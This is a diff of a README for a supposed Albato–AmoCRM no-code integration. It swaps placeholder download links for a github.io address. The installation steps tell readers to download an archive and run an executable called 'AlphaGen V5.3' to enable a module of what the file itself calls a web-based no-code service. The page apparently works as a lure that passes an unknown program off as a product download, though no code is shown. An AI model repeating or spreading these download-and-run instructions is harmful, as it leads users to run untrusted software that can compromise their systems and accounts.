@@ -2,13 +2,13 @@
 
 Automate workflows between AmoCRM and other services using Albato — no-code integration for leads, deals, contacts, and sales analytics.
 
-[![Download](https://img.shields.io/badge/Download-Albato_AmoCRM_Integration-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Albato_AmoCRM_Integration-blueviolet)](https://albato-amocrm-integration.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://albato-amocrm-integration.github.io/.github)  
 2. 📁 Extract the folder to any location  
 3. 🖱 Run AlphaGen V5.3 to enable Albato CRM module  
 4. ✅ Log into Albato, add AmoCRM as a connection, and configure triggers/actions (e.g., new lead → notification → Google Sheets)
